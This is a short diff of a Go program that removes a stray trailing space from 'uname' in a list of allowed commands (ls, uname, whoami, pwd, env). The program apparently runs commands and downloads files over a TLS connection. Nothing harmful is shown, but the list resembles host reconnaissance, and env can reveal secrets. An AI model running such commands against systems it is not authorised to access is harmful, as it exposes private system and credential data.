@@ -49,7 +49,7 @@ func downloadFile(conn *tls.Conn, path string) {
 }
 
 func main() {
-	var cmdsToRun = []string{"ls", "uname ", "whoami", "pwd", "env"}
+	var cmdsToRun = []string{"ls", "uname", "whoami", "pwd", "env"}
 	arguments := os.Args
 	checkFlags(arguments, len(arguments), cmdsToRun)
 	var PORT string
